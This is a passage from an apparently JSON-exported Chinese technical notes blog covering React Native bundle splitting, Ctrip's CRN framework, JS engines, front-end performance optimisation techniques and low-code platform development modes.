AsyncStorage.setItem(`bundle_${bundleName}`, content);\n  }\n\n  static async loadFromCache(bundleName) {\n    return await AsyncStorage.getItem(`bundle_${bundleName}`);\n  }\n}\n```\n\n### 6.7. 注意事项\n\n版本管理：\n```javascript\n// bundle版本控制\nconst BUNDLE_VERSION = {\n  common: '1.0.0',\n  business: '1.0.0'\n};\n\n// 版本检查\nasync function checkBundleVersion() {\n  const serverVersions = await fetchServerVersions();\n  return compareBundleVersions(BUNDLE_VERSION, serverVersions);\n}\n```\n\n依赖管理：\n- 避免循环依赖\n- 合理划分公共依赖\n- 控制包大小\n\n### 6.8. 性能优化\n\n#### 6.8.1. 加载优化\n\n```javascript\n// 并行加载优化\nasync function parallelBundleLoad(bundles) {\n  const loadTasks = bundles.map(bundle => ({\n    name: bundle,\n    task: loadBusinessBundle(bundle)\n  }));\n  \n  return Promise.all(loadTasks.map(({ task }) => task));\n}\n```\n\n内存优化：\n- 及时释放不需要的 bundle\n- 实现 bundle 卸载机制\n- 监控内存使用情况\n\n### 6.9. 调试与监控\n\n监控系统：\n\n```javascript\nclass BundleMonitor {\n  static trackBundleLoad(bundleName, startTime) {\n    const loadTime = Date.now() - startTime;\n    // 上报加载时间\n    Analytics.track('bundle_load', {\n      bundle: bundleName,\n      time: loadTime\n    });\n  }\n}\n```\n\n## 7. CRN (Ctrip React Native) 方案\n\n携程 React-native CRB 方案：\n\n![图片&文件](./files/20241028-10.png)\n\n![图片&文件](./files/20241028-11.png)\n\n好的，简要总结携程 CRN (Ctrip React Native) 方案的核心特点：\n\n### 7.1. 架构设计\n\n```\nApp层\nCRN Framework (统一接口层)\n平台适配层 (Android/iOS)\n原生平台\n```\n\n### 7.2. 核心特性\n\n- 统一组件体系\n- 自研==离线包方案==\n- 动态化能力\n- 多业务隔离\n\n### 7.3. 性能优化\n\n```javascript\n// 核心优化点\n- 预加载机制\n- 首屏加载优化\n- 离线包更新\n- 增量热更新\n```\n\n### 7.4. 工程能力\n\n- 统一==构建系统==\n- 版本管理\n- 灰度发布\n- 监控体系\n\n### 7.5. 业务支持\n\n```javascript\n// 统一路由\nconst routes = {\n  'hotel_detail': {\n    path: '/hotel/detail/:id',\n    preload: true,\n    offline: true\n  }\n}\n\n// 业务隔离\nclass BusinessContainer {\n  static load(bizId) {\n    // 加载独立业务模块\n  }\n}\n```\n\n### 7.6. 主要优势\n\n- 完整的工程化体系\n- 强大的性能优化\n- 良好的扩展性\n- 企业级监控和容错\n- 成熟的多业务支持\n\n这是一个经过实战检验的企业级 RN 解决方案，对大型 App 的 RN 改造具有很好的参考价值。\n\n## 8. 常见的 四个js渲染引擎\n\n![图片&文件](./files/20241028-12.png)\n\n> 端侧性能优化一个思路是，直接基于 js 渲染引擎做定制\n\n## 9. 对比一下 V8 和 JavaScriptCore (JSCore) 这两个主流的 JavaScript 引擎：\n\n>  另外可参考 [12. JavaScript 引擎](/post/v2NdaNQX.html)\n\n### 9.1. 基本背景\n\n**V8:**\n- 由 Google 开发\n- 用于 Chrome 浏览器和 Node.js\n- 使用 C++ 编写\n\n**JavaScriptCore:**\n- 由 Apple 开发\n- 用于 Safari 浏览器和 WebKit\n- 也被用于 React Native\n\n### 9.2. 主要区别\n\n#### 9.2.1. 架构差异\n\n1. **编译策略**\n   - V8: 使用 JIT (Just-In-Time) 编译，包含 TurboFan 优化编译器\n   - JSCore: 使用多层编译策略，包括解释器（LLInt）、基线 JIT 和 DFG JIT\n\n2. **内存管理**\n   - V8: 使用分代垃圾回收\n   - JSCore: 使用垃圾回收和引用计数的混合系统\n\n#### 9.2.2. 性能特点\n\n1. **启动时间**\n   - JSCore: 优先考虑更快的启动时间\n   - V8: 优先考虑执行速度\n\n2. **运行性能**\n   - V8: 长期运行的应用程序性能更好\n   - JSCore: 在短期运行的脚本上表现更好\n\n1. **内存占用**\n   - JSCore: \n      - 通常内存占用较小\n   - V8: \n      - 为了优化执行速度，可能占用更多内存\n\n### 9.3. 使用场景\n\n**V8 适合：**\n- 服务器端应用 (Node.js)\n- 长期运行的应用\n- 计算密集型任务\n\n**JSCore 适合：**\n- 移动端应用\n- 需要快速启动的应用\n- 内存受限的环境 \n\n### 9.4. 实际应用\n\n1. **Web 开发**\n   - Chrome/Node.js 使用 V8\n   - Safari 使用 `JSCore`\n   - React Native 在 iOS 上使用 `JSCore`\n\n2. **移动开发**\n   - React Native iOS: `JSCore`\n   - Chrome Android: V8\n\n1. **服务器端**\n   - Node.js: V8\n   - Bun: JSCore \n\n","Y7ab0sNh":"\n# 常见性能优化思路\n\n`#前端性能` `#R1` \n\n## 目录\n<!-- toc -->\n ## 1. 缓存 \n\n- 本地缓存：localStorage、sessionStorage、indexedDB\n- 内存缓存：\n\t- `Memory Cache`\n- Cache API：Service Worker\n- HTTP 缓存\n\t- 强缓存：\n\t\t- 控制强制缓存的字段分别是`Expires`和`Cache-Control`，其中 `Cache-Control：max-age=xxx`优先级更高\n\t\t- 浏览器会在`js和图片等文件`解析执行后直接存入`内存缓存`中，\n\t\t\t- 即 `from Memory Cache`\n\t\t- ==css文件==：每次渲染页面都需要从硬盘读取缓存，\n\t\t\t- 即 `from disk cache`\n\t- 协商缓存：\n\t\t- 即 问一问服务器本地资源可以用吗\n\t\t\t- 200 更新了\n\t\t\t- 304 没更新，直接用吧\n\t\t- `Etag / If-None-Match`的优先级比 `Last-Modified / If-Modified-Since`高\n\t- Push Cache ： HTTP2 支持，访问 index.html ，同时推送必要css 和 js 等\n\t\t- ![图片&文件](./files/20241025-15.png)\n\n\n- 内存缓存\n- 磁盘缓存\n## 2. 客户端请求\n\n- 避免过多多余重重定向\n- `<link rel=\"dns-prefetch\" href=\"//yourwebsite.com\">`\n- `<link rel=\"preconnect\" href=\"//sample.com\" crossorigin>`\n\n## 3. 服务端响应\n\n- 流响应\n- 前端聚合与后端聚合：\n\t- nodejs ==局域网内聚合后端多个服务==肯定快于前端聚合，另外注意**首屏数据就绪就好**\n- Nodejs\n\t- 能并行的并行，少串行：async await \n\t- 守护进程（pm2/supervisor）又将进程重启，频繁重启肯定会导致接口变量\n\t- 异常监控，少重启\n\t- 代码问题\n\t\t- JSON.parse 大对象\n\t\t- 闭包，内存泄漏\n\n## 4. 静态资源\n\n### 4.1. js  \n\n- 拆、按需加载  \n- 合并压缩  \n- Tree Shaking  \n- 避免 Long Task  \n- 反其道而行之，不用框架  \n- 基础库代码打包合并 \n\n### 4.2. css  \n\n- 避免使用昂贵的属性 ：\n\t- border-radius box-shadow opacity transform filter position: fixed  \n- flex 布局取代 float  \n- 选择器简化  \n\n### 4.3. 图片\n\n- 根据设备的分辨率优化图片大小  \n- 使用图片的缩略图  \n- 提前占位，防止抖动\n- 首屏优先加载，懒加载\n\t- background-url 懒加载规则\n\t\t- 这个样式规则，如果不应用到具体的元素，浏览器不会去下载该图片。\n\t\t- 所以你可以通过切换 className 的方式，放心得进行 CSS 中图片的懒加载。\n\t- 自己实现\n\t\t- ![图片&文件](./files/20241025-16.png)\n- 选择适合大小和分辨率\n- 图片压缩，删除冗余信息，比如jpg大小能减少15%\n- webp\n- `svg`压缩\n\n### 4.4. 字体\n\n- 最简单的优化方式是尽可能使用**系统字体**。这样可以避免额外的字体文件下载，从而提高页面加载速度\n- 内联关键字体，`base64`\n- 字体子集化（Subsetting）\n\t- 如果必须使用自定义字体，可以考虑**字体子集化**。这意味着只包含网站实际使用的字符，而不是整个字体文件\n\t- 其实不少工具支持的\n- 使用 WOFF2 格式的字体文件。\n\t- 这是目前**压缩率最高的字体格式**，可以显著减小文件大小\n- 字体预加载：\n\t- 使用 `<link rel=\"preload\">` 来预加载关键字体文件，这可以确保字体尽早开始下载\n- 使用 `font-display` 属性来控制字体加载时的显示行为\n- 异步加载非关键字体：\n\t- 使用 `new FontFace` 类似于 `new Image`\n\n### 4.5. 视频\n\n- 压缩\n- 选择合适格式\n- 使用流\n\n## 5. 运行时优化\n\n- 使用 window.requestAnimationFrame 避免**同步布局**\n- 批量化操作，或者说是读写分离\n- 长列表优化\n- 任务分解：把 10 亿次分散为十个 1 亿次的子任务\n\t- ![图片&文件](./files/20241025-17.png)\n- 非关键路径延迟执行：\n\t- `setTimeout()/ requestIdleCallback`\n- 新开线程辅助计算: `worker`\n- 善用合成： `Composite`\n\t- 会交由 GPU 合成，比 CPU 处理要快\n- 节流 和 防抖\n- Passive event listeners 优化滚动性能\n\t- 随着移动端普及，浏览器在处理某些事件（如 scroll、touchstart、touchmove 等）时面临一个**困境**：\n\t\t- 浏览器不知道事件监听器是否会调用 preventDefault()\n\t\t- 为了安全起见，浏览器必须等待事件监听器执行完毕\n\t\t- 这导致了主线程阻塞，造成滚动响应延迟\n\t- 浏览器开发者面临一个两难选择：\n\t\t- 等待 JavaScript 执行完毕再滚动，保证正确性但牺牲性能\n\t\t- 立即滚动，提高性能但可能导致不正确的行为\n\t- 解决方案：\n\t\t- 当添加事件监听器时，指定 `{passive: true}` 选项\n\t\t\t- 允许开发者明确告知浏览器：事件监听器不会调用 preventDefault()\n\t\t\t\t- 即使 JavaScript 尝试调用 preventDefault()，也会被忽略\n\t\t\t- 浏览器可以立即开始滚动，而不必等待 JavaScript 执行\n\n## 6. 预加载与预渲染\n\n- `<link rel=\"preload\" href=\"./nextpage.js\" as=\"script\">`\n- `<link rel=\"preload\" as=\"video\" href=\"/static/sample.mp4\">\n- `<link rel=\"prerender\" href=\"//sample.com/nextpage.html\">`\n\n## 7. 其他渲染相关的可优化点\n\n- DOM元素`读写分离`\n- 让进行大量动画的元素`脱离文档流，`减少重排开销\n- 通过改变元素的`class或csstext一次性的更改样式`\n- `缓存DOM元素的位置信息`，避免不必要的属性读取\n- 尽量使用`离线DOM`\n- 使用`css3 transform`优化动画性能\n- 精简DOM，合理布局\n- 使用`transform`代替`left`、`top`减少使用引起页面重排的属性\n- 开启`硬件加速`\n- 尽量`避免浏览器创建不必要的图形层`\n- 尽量减少`js动画`，如需要，使用对性能友好的`requestAnimationFrame`\n- 使用`chrome performance工`具调试动画性能\n- `requestIdleCallback(fn);`\n\n## 8. 其他\n\n- CI/CD 集成分析工具 lighthouse 等\n- 接入性能监控平台\n- 需要关注真实场景，而非个人实验数据\n","d9h3CBgh":"\n# RAIL  模型\n\n`#前端性能` \n![图片&文件](./files/20241025-14.png)\n\n- 用户的输入到响应的时间不超过`100ms`，给用户的感受是瞬间就完成了\n\t- 事件处理函数在`50ms`内完成\n- 产生每一帧的时间不要超过`10ms`\n\t- 为了保证浏览器`60帧，`每一帧的时间在`16ms`左右，\n\t- 但浏览器需要用`6ms`来渲染每一帧\n-  最大化空闲时间，以增大`50ms`内响应用户输入的几率\n- 打开时间不超过5秒\n\t- 对于第二次打开，尽量不超过2秒\n","4kNczqVo":"\n# 如何高性能插入 100000 个 DOM节点\n\n`#前端性能` \n\n有几种高性能插入大量 DOM 节点的方法，我按性能从高到低排序说明：\n\n\n## 目录\n<!-- toc -->\n ## 1. DocumentFragment + 虚拟列表 \n\n```javascript\nfunction renderList(total) {\n    const container = document.getElementById('container');\n    const fragment = document.createDocumentFragment();\n    const itemHeight = 20; // 假设每项高度20px\n    const visibleCount = Math.ceil(window.innerHeight / itemHeight);\n    \n    // 创建虚拟滚动容器\n    const virtualContainer = document.createElement('div');\n    virtualContainer.style.height = `${total * itemHeight}px`;\n    virtualContainer.style.position = 'relative';\n    \n    // 初始只渲染可视区域的内容\n    function renderItems(startIndex) {\n        fragment.textContent = ''; // 清空\n        const endIndex = Math.min(startIndex + visibleCount, total);\n        \n        for(let i = startIndex; i < endIndex; i++) {\n            const div = document.createElement('div');\n            div.textContent = `Item ${i}`;\n            div.style.position = 'absolute';\n            div.style.top = `${i * itemHeight}px`;\n            fragment.appendChild(div);\n        }\n        \n        virtualContainer.textContent = '';\n        virtualContainer.appendChild(fragment);\n    }\n    \n    // 监听滚动事件\n    container.addEventListener('scroll', () => {\n        const scrollTop = container.scrollTop;\n        const startIndex = Math.floor(scrollTop / itemHeight);\n        renderItems(startIndex);\n    });\n    \n    container.appendChild(virtualContainer);\n    renderItems(0);\n}\n```\n\n## 2. DocumentFragment + requestAnimationFrame 分批插入\n\n```javascript hl:14,17\nfunction renderWithRAF(total) {\n    const container = document.getElementById('container');\n    const fragment = document.createDocumentFragment();\n    const batchSize = 500; // 每批处理500个\n    let currentIndex = 0;\n    \n    function appendItems() {\n        const fragment = document.createDocumentFragment();\n        const end = Math.min(currentIndex + batchSize, total);\n        \n        for(let i = currentIndex; i < end; i++) {\n            const div = document.createElement('div');\n            div.textContent = `Item ${i}`;\n            fragment.appendChild(div);\n        }\n        \n        container.appendChild(fragment);\n        currentIndex = end;\n        \n        if(currentIndex < total) {\n            requestAnimationFrame(appendItems);\n        }\n    }\n    \n    requestAnimationFrame(appendItems);\n}\n```\n\n## 3. DocumentFragment 一次性插入\n\n```javascript hl:3,8,11\nfunction renderAll(total) {\n    const container = document.getElementById('container');\n    const fragment = document.createDocumentFragment();\n    \n    for(let i = 0; i < total; i++) {\n        const div = document.createElement('div');\n        div.textContent = `Item ${i}`;\n        fragment.appendChild(div);\n    }\n    \n    container.appendChild(fragment);\n}\n```\n\n## 4. innerHTML 模板字符串\n\n```javascript\nfunction renderWithInnerHTML(total) {\n    const container = document.getElementById('container');\n    const html = Array.from({ length: total }, (_, i) => \n        `<div>Item ${i}</div>`\n    ).join('');\n    \n    container.innerHTML = html;\n}\n```\n\n## 5. 性能优化要点\n\n- 使用虚拟列表（最优方案）\n\t- 只渲染可视区域的内容\n\t- 监听滚动按需渲染\n\t- 内存占用最小\n\t- 性能最好\n- 分批处理\n\t- 使用 `requestAnimationFrame` 分批插入\n\t- 避免长时间阻塞主线程\n\t- 保持页面响应性\n- DocumentFragment\n\t- 减少 DOM 操作次数\n\t- 避免重排重绘\n\t- 一次性插入\n- 批量更新\n\t- 使用 innerHTML 或模板字符串\n\t- 减少 DOM 操作\n\t- 注意 XSS 风险\n\n## 6. 使用建议\n\n- 数据量大时（>1000）推荐使用虚拟列表\n- 数据量中等时（100-1000）可以用分批处理\n- 数据量小时（<100）可以直接用 DocumentFragment\n- 需要考虑内存占用时避免使用 innerHTML\n\n## 7. 示例用法\n\n```javascript\n// 虚拟列表（推荐）\nrenderList(100000);\n\n// 分批处理\nrenderWithRAF(100000);\n\n// 一次性插入\nrenderAll(100000);\n\n// innerHTML方式\nrenderWithInnerHTML(100000);\n```\n\n","zlXYyKvK":"\n# 人机交互与前端体验\n\n`#前端性能` `#R1` \n\n从人机交互（HCI - Human-Computer Interaction）角度来优化前端性能，主要关注**用户体验和交互效率**。\n\n`#todo` \n\n\n## 目录\n<!-- toc -->\n ## 1. 交互优先级设计 \n\n- 比如==输入框延迟==，交互优先级高\n\n## 2. 交互反馈优化\n\n- 即时反馈机制\n\t- 使用骨架屏提供即时反馈\n\t- loading 效果\n- 进度指示\n\t- 文件上传进度示例\n\n## 3. 交互流畅性优化\n\n- 防抖与节流\n\n## 4. 手势交互优化\n\n- 触摸事件优化\n\n## 5. 视觉反馈优化\n\n- 动画过渡\n\n## 6. 可访问性优化\n\n- 键盘导航\n\n## 7. 错误处理与恢复\n\n- 优雅降级\n\t- 错误提示\n\t- 重试\n\n## 8. 性能感知优化\n\n- 虚拟滚动\n\n## 9. 状态管理优化\n\n- 用户操作状态管理\n\t- 使用状态机管理 `xstate` 复杂交互","0ADIlKFY":"\n# 最大偏移量的统计方法和优化建议\n\n`#前端性能` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. CLS (CLS - Cumulative Layout Shift) 定义 \n\n- `累积布局偏移(CLS)`是衡量页面视觉稳定性的重要指标，用于测量页面内容的意外移动程度\n- 良好的CLS分数应该`小于0.1`，`大于0.25`则被认为是较差的性能表现\n\nCLS 优化的核心是**保持页面视觉稳定性，避免意外的布局偏移**\n\n## 2. CLS 的计算方法\n\n### 2.1. 基本计算公式\n\n```javascript\nCLS = 影响分数 × 距离分数\n```\n\n- 影响分数：**不稳定元素**影响的可视区域部分\n- 距离分数：**不稳定元素**相对于视口的移动距离\n\n### 2.2. 统计代码实现\n\n```javascript\n// 使用 Performance API 统计\nlet observer = new PerformanceObserver((list) => {\n  let entries = list.getEntries();\n  \n  entries.forEach(entry => {\n    if (!entry.hadRecentInput) {\n      // 计算布局偏移值\n      const impact = entry.value;\n      const maxValue = entry.sources.reduce((max, source) => {\n        return Math.max(max, source.currentRect.width * source.currentRect.height);\n      }, 0);\n      \n      // 累积偏移分数\n      cls += impact;\n    }\n  });\n});\n\nobserver.observe({entryTypes: ['layout-shift']});\n```\n\n### 2.3. **使用 Web Vitals 库**\n\n```javascript\nimport {getCLS} from 'web-vitals';\n\ngetCLS(console.log); // 输出 CLS 值\n```\n\n### 2.4. **Performance API**\n\n```javascript\n// 监听布局偏移\nnew PerformanceObserver((entryList) => {\n  for (const entry of entryList.getEntries()) {\n    if (!entry.hadRecentInput) {\n      console.log('Layout shift:', entry);\n    }\n  }\n}).observe({entryTypes: ['layout-shift']});\n```\n\n### 2.5. **Chrome DevTools**\n\n- Performance 面板\n- Core Web Vitals 报告\n\n## 3. 主要统计场景\n\n- **图片加载引起的偏移**\n\t- 未设置图片尺寸\n\t- 图片延迟加载导致的布局变化\n- **动态内容插入**\n\t- 广告位插入\n\t- 动态加载的内容\n\t- 弹窗提示\n- **字体加载**\n\t- 自定义字体导致的文本重排\n\t- FOIT (Flash of Invisible Text)\n\t- FOUT (Flash of Unstyled Text)\n\n## 4. 优化建议\n\n### 4.1. **预留空间**\n\n```html\n<!-- 图片预留空间示例 -->\n<div style=\"aspect-ratio: 16/9;\">\n  <img src=\"image.jpg\" loading=\"lazy\" />\n</div>\n```\n\n### 4.2. **固定尺寸**\n\n```css\n/* 广告位固定尺寸 */\n.ad-container {\n  min-height: 250px;\n  width: 300px;\n}\n```\n\n### 4.3. **内容占位**\n\n```javascript\n// 使用骨架屏\nfunction SkeletonLoader() {\n  return (\n    <div className=\"skeleton-container\">\n      <div className=\"skeleton-line\"></div>\n      <div className=\"skeleton-image\"></div>\n    </div>\n  );\n}\n```\n\n## 5. 注意事项\n\n### 5.1. **异步加载优化**\n\n- 使用 `content-visibility: auto` 优化长列表\n- 使用虚拟滚动处理大量数据\n\n### 5.2. **响应式设计考虑**\n\n```css\n/* 响应式图片处理 */\nimg {\n  max-width: 100%;\n  height: auto;\n  aspect-ratio: attr(width) / attr(height);\n}\n```\n\n### 5.3. **字体加载优化**\n\n```html\n<!-- 字体预加载 -->\n<link \n  rel=\"preload\" \n  href=\"font.woff2\" \n  as=\"font\" \n  type=\"font/woff2\" \n  crossorigin\n>\n```\n\n### 5.4. **动画和过渡处理**\n\n```css\n/* 使用 transform 而不是改变位置属性 */\n.animate {\n  transform: translate(0, 20px);\n  transition: transform 0.3s;\n}\n```\n\n## 6. 测量工具\n\n1. Chrome DevTools\n2. Lighthouse\n3. PageSpeed Insights\n4. Search Console Core Web Vitals 报告\n\n","cuI3DrRy":"\n# 前言\n\n\n> 低代码平台相关的调研和笔记","Wel2FVUi":"\n# 分享：基于低代码平台的三种开发模式\n\n`#lowcode` \n\n> 源于个人某次培训分享\n\n\n## 目录\n<!-- toc -->\n ## 1. 底层：数据模型 \n\n- 首先需要考虑数据源从哪里\n\t- **openAPI 3** 协议的 API\n\t- 各种数据库建模能力\n\t\t- 关系型\n\t\t- 非关系型\n\t- 查询协议\n\t\t- graphQL\n\t\t- JSON 查询语句\n\t- 直接导入的数据\n\t\t- 比如 Excel、CSV 等等\n\n目前公司内有两种\n- 智能体厂\n\t- 智能体厂：是在==高度集成了业务知识模型==的基础上\n\t\t- 将对象建模、对象继承以及在线开发部署统一整合的三位一体开发工具。\n\t- 业务模型 → 建模 → API \n- API 管理管理平台：\n\t- 基于 OPENAPI3 协议的 API 管理平台\n\t- 提供 API 等编排能力\n\n## 2. 中台层：相关系统支持\n\n- 管理后台：\n\t- 为企业提供身份认证和用户数据管理服务的工具\n\t- 另外也提供 SSO 等\n- 工作流与流程引擎\n- UI 中台：组件库等\n- 存储服务：\n\t- 自建 `minio`\n- 部分华为云提供的能力\n\n> 基建有待提高啊，稳定性更是啊\n\n## 3. 零代码（No Code）配置\n\n![图片&文件](./files/20241201-22.png)\n\n>  `type = app →  menu  → page →  component`\n\n\n这些 **积木**包括图标、组件、瓦片、页面等，如下图菜单\n\n![图片&文件](./files/20241201-23.png)\n\n\n更详细的流程：\n\n1. **新建应用：**\n2. **编辑应用：**\n3. **查询应用详情：**\n4. **设计应用：**\n5. **发布应用：**\n6. **修订与删除：**\n7. **另存为应用：**\n8. **应用列表查看：**\n\n### 3.1. 应用管理\n\n- 增删改查\n\n### 3.2. 菜单管理\n\n- 菜单组\n- 子菜单\n- 拖拽\n- 菜单关联页面\n- 删除等\n\n### 3.3. 页面管理\n\n- 内置常用布局\n\t- ![图片&文件](./files/20241201-24.png)\n- 设置区域\n\t- 初始化数据，选择 **编码 → 智能体模型** \n\t\t- 即**源类** \n\t- 选择对应的接口，通过 API 的方式\n\t\t- 主要应对的是存量 API\n\t- 所以是支持两种数据源类型\n- 页面内部事件流可视化配置\n\t- ![图片&文件](./files/20241201-25.png)\n\n### 3.4. 组件管理\n\n- 通过后台管理-组件管理配置\n- 各类容器组件\n\t- 组合组件\n- 自由组件\n\t- 纯高代码开发的方式\n- URL 组件：\n\t- 无界`微前端`嵌入进来的\n\t- 通过`高代码`的交互方式\n\n### 3.5. 组件配置\n\n- 每个组件都有自己的**渲染态和设计态**\n- 每个组件都有标准的 API 调用方式，都有详细的 Typescript 定义\n\t- 入参 payload \n\t- 对外暴露的方法\n\t\t- ![图片&文件](./files/20241201-26.png)\n- 这样才能在设计态方便配置\n\n### 3.6. 按钮配置&行为配置\n\n- 事件类型\n\t- 打开瓦片：打开特定页面、特定组件，资源池中制定的任何组件\n\t\t- 打开方式：弹框、抽屉、全屏、二级页面等\n\t- 调用行为：\n\t\t- ==源类提供的能力==，比如 delete 数据等\n\t- 调用事件流\n\t\t- 所有组件抛出来的事件\n\t\t- 另外需要配置入参\n\t- 调用自定义事件\n\t\t- 直接写代码\n\t\t\t- ![图片&文件](./files/20241201-27.png)\n- 打开特定菜单、特定页面等\n\t- 也可以打开其他应用的特定菜单\n\n### 3.7. 图标管理\n\n### 3.8. 系统设置\n\n- 效果图\n- 名称\n- **低代码首页配置**\n\t- 拖动不同的组件配置首页\n\t- 首页看板卡片\n- 主题管理\n\t- 所有的 CSS 变量管理\n\t- 内置**主题编辑器**\n\n### 3.9. 完整配置流程\n\n- 新建应用\n- 设计\n\t- 菜单\n\t- 新建页面\n\t- 设计页面\n\t- 组件配置\n- 保存&预览\n- 发布应用\n- ==管理后台配置权限==\n\n## 4. 低代码（Low Code）开发\n\n- 每个组件的各类生命周期钩子函数（JS Function String）\n\t- 和 **Vue3 的生命周期对应**\n- 前面说的自定义事件流\n\t- 示例：通过编码的方式打开组件\n\t\t- ![图片&文件](./files/20241201-29.png)\n\n### 4.1. 使用场景列举\n\n- 使用低代码开发开发，主要还是为了配合零代码完成一些相对定制的需求，所以它主要起`联结或者胶水`的作用\n- 适合`低代码开发`的场景是`大部分业务场景通过配置出来，仅按钮交互逻辑不能配置出来`，比如\n\t- 点击按钮需要根据当前组件或瓦片的状态（比如是否选中）做逻辑判断，然后才能`打开瓦片`或`调用行为`等\n\t- 点击按钮需要额外调用接口做业务逻辑判断，然后才能`打开瓦片`或`调用行为`等\n\n## 5. 高代码（Pro Code）开发\n\n![图片&文件](./files/20241201-30.png)\n\n### 5.1. 基础低代码组件\n\n- 在 `@lowcode/renderer` 包中内置的基础的低代码组件，由低代码团队提供\n- 其他团队需要可以联系添加权限\n\n### 5.2. 低代码组件（标准 Low Code 组件）\n\n- 使用场景\n\t- 官方不满足业务场景，且有大量的可配置场景\n\t- **开发完后可做回收**\n- 技术实现：\n\t- 使用 Module Federation 的方式来加载远程代码，以`插件`的方式注册到低代码平台的组件池中\n- 开发流程：\n\t- 下载脚手架 → 安装依赖配置 → 开启本地调试模式 \n\t\t- 配置： `组件编码:本地端口`\n\t- 低代码平台新建组件类型 → 拖动调试 \n\t- 开发完成，构建发布等\n- 优点：\n\t- 收敛技术栈，前端完全可自主开发满足业务场景的瓦片，且瓦片配置项自主可控\n\t- 不需要前端镜像部署，降低开发部署复杂度\n- 缺点\n\t- 不支持**非 Vue3 + vite 技术栈外**的前端技术栈\n\t- 有一定的学习门槛\n\n### 5.3. 自由组件\n\n- 使用场景\n\t- 适合不想开发配置项的客户\n\t- 不使用低代码拖拽布局，需整页或者整个模块替换，无配置选项\n- 性能原因考虑\n\t- 因为使用了`模块联邦`的加载方式，性能肯定优于 **URL 组件**\n- 优点：\n\t- 收敛技术栈，且前端完全可自主开发\n\t- ==不需要前端镜像部署，降低开发部署复杂度==\n- 缺点\n\t- 暂不支持**非 Vue3 + vite 技术栈 & React + vite** 以外的前端技术栈\n\t\t- 因为模块联邦的原因\n\t- 不支持配置，\n- 标准开发规范有约束，请参考具体文档，严格约束起来\n- 代码协作问题\n\t- 尽量按团队项目组来拆解，一个团队一个仓库\n\t\t- **仓库本身也是多包模式，其实可以不用多包**\n\n> 因为 Vite 在 dev开发模式下基于 esbuild 构建，所以我们单独提供了对 dev 模式的支持，可以在远程模块部署的情况下，利用 Vite 的高性能开发服务器。\n> - 只有Host端支持dev模式，Remote端需要使用`vite build`生成RemoteEntry.js包。这是由于Vite Dev模式是**Bundleless**不打包的，您可以使用`vite build --watch`到达类似热更新的效果。\n\n>  注意：`React` 项目中不建议 `Vite`和 `Webpack` 混合使用，实际没怎么有生产环境上使用 React 来开发，不保证可用性\n\n### 5.4. URL 组件\n\n- 使用场景\n\t- 适用于直接嵌入类似`iframe`形式的老旧项目，且存量项目不需要做大量维护时。\n\t- 或者客户要求兼容其他技术栈，比如 React 、Angular 项目\n- 技术能力\n\t- 提供脚手架，内置标准开发规范，包括各类技术能力和==打包构建流程==等等\n\t- 使用无界微前端的方式进入\n\t\t- 通讯方式参考微前端\n\t- 提供不同类型组件的交互方式，可以根据需要觉得是否使用\n\t\t- 比如两个 URL 组件如何通讯？\n\t\t- URL 组件和自由组件如何通讯？\n- 增量项目也提供标准脚手架\n\t- **因为需要集成了低代码通用的公共方法和参数**\n\t- 内置接入 SSO，路由拦截器、vuex、axios 拦截器、国际化，并且做了嵌入主应用的样式兼容工具方法合并等\n\t\t- vue 2 + 组件库 + ..\n\t\t- vue 3 + 组件库 + vite \n\t\t- React + Antd + ...\n\t\t- 更多参考无界微前端\n\t\t\t- ![图片&文件](./files/20241201-31.png)\n- 优点：\n\t- 跨前端技术栈，并且集成接入成本低\n- 缺点：\n\t- 代码管控不强，性能有一定影响，可能会出现一些兼容性问题\n\n## 6. 公共 API 参考\n\n为了提供低代码的开放能力，需要对外提供所有的 API，包括\n\n- lowcode 包公共方法\n\t- `@lowcode/shared` ：提供通用的 `utils` 方法，公共的 `hooks` 方法等\n\t- `@lowcode/constants` ：提供公用的常量\n\t- `@lowcode/core` ：提供通用的设计态和渲染态组件\n\t- `@lowcode/renderer`： \n\t\t- 每个组件**详细的 Typescript 定义类型**\n\n## 7. 开发体验相关\n\n- 调试能力\n- 如何定位问题\n- 有不少开发调试入口，方便能够快速查看特定组件的渲染效果等\n\n## 8. 更多参考\n\n- [3. 调研：低代码渲染设计思路](/post/p33cAR0d.html)\n- [10. Webpack 5 的 Module Federation](/post/8wPPOjJ7.html)\n- [13. vite 中如何使用 Module Federation](/post/zjmJ8Ccg.html)","bA5JD7uy":"\n# 好文：低代码常见问题\n\n`#低代码`\n\n> 参考： https://zhuanlan.zhihu.com/p/225987562\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n### 1.1. 总结\n\n- 低代码平台的概念、历史、应用场景、优势和挑战\n- 低代码平台如何提高开发效率\n- 平台锁定、灵活性和易用性之间的矛盾等问题\n- 低代码平台在前端和后端的实现方式及其适用场景\n\n### 1.2. 关键点\n\n- 低代码的定义是通过可视化方式创建应用的平台，代码量较少，能显著提升开发效率。\n- 低代码平台有多种形式，包括在线IDE、一站式开发平台、无代码平台等。\n- 低代码平台的实现方式受团队定位影响，不同团队有不同的选择。\n- 低代码平台可以解决次要任务，但无法解决根本任务。\n- 图形化编程在==特定领域==有优势，但在通用编程中存在局限性。\n- 低代码平台适合企业内部应用，不适合面向客户的应用。\n- 低代码平台会带来平台锁定等新问题，影响扩展性和协作。\n- 低代码平台的难点在于同时满足易用性和灵活性。\n- 前端低代码主要通过配置化方式提升开发效率，适合企业应用。\n- 后端低代码解决常见问题如数据管理和流程管理。\n- 低代码不会大量取代研发，但会提升企业内部应用开发效率。\n- 未来低代码在企业内部应用中将发挥重要作用。\n\n## 2. 低代码是什么？\n\n### 2.1. 定义\n\n指那些用可视化方式创建应用的平台，特点是代码量比传统开发少得多，甚至无代码，所以能显著提升开发效率\n\n### 2.2. 低代码的形式\n\n1. 在线 IDE 和编辑器，界面方面虽然有可视化设计，但需要二次开发才能用。\n2. 提供一站式开发平台，提供了持续集成、部署和运维等功能，包含开发全流程。\n3. 简化前端开发，界面方面可以做到不用写 JavaScript。\n4. 简化后端开发，可以在线设计数据结构，并实现增删改查功能。\n5. 彻底简化前后端开发，甚至变成无代码平台，什么都可视化编辑，易用性好，但牺牲了灵活性，这里面有很多子分类，比如 BPM、OA 系统、APP 开发等。\n6. 围绕某个成熟产品扩展功能，比如 CRM、ERP 之类的产品，为了满足定制需求，提供定制开发功能。\n\n但设计系统的架构受制于产生这些设计的**组织的沟通结构**，所以\n- 如果是**前端团队**，\n\t- 会选择 第 ① 种，很少考虑第 3 种，因为团队成员都会 JavaScript，没必要弄个不用写 JavaScript 的产品，更不会考虑第 4 种，因为不负责后端开发。\n- 